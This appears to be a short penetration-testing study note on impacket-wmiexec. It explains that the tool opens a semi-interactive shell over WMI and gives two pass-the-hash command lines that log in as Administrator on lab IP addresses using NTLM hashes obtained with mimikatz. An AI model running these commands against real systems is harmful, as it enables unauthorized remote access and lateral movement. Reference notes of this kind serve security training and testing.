---
tags:
---
# wmiexec

Executes a semi-interactive shell using WMI.

Requires `ADMIN$` share to be available. Only works against Active Directory domain accounts and the built-in local administrator account.

## Capabilities

```bash
# Authenticate with hash
impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73
impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
```

Note: In the hash example, we fill in the left side of the colon with zeros, and the right is the administrators NTLM hash pulled from `mimikatz`
